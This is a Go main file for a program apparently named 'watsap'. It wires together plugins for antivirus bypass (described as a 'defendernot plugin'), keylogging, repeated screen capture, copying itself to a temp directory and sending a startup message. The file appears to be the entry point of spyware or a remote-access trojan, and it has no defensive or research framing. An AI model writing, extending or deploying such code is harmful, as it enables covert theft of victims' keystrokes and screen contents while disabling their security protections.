package main

import (
	"log"
	"sync"
	"watsap/plugins/avbypass"
	"watsap/plugins/keylog"
	"watsap/plugins/screen"
	"watsap/utils"
	"watsap/utils/config"
	"watsap/utils/messages"
	"watsap/utils/wainit"
)

func init() {
	config.DebugMode = false
	config.WaLogging = true
}

func runSafe(wg *sync.WaitGroup, name string, fn func()) {
	wg.Add(1)
	go func() {
		defer wg.Done()
		defer func() {
			if r := recover(); r != nil {
				log.Printf("[%s] Recovered from panic: %v", name, r)
			}
		}()
		fn()
	}()
}

func main() {
	avbypass.Main()              // initialize defendernot plugin
	wainit.InitWa()              // initialize watsap
	messages.StartupMessage1()   // send init message

	var wg sync.WaitGroup

	runSafe(&wg, "CopySelf", func() { utils.CopySelfToTempDir() })
	runSafe(&wg, "Keylog", func() { keylog.InitKeylog() })
	runSafe(&wg, "Screen", func() { screen.LoopScreen() })

	wg.Wait()
}
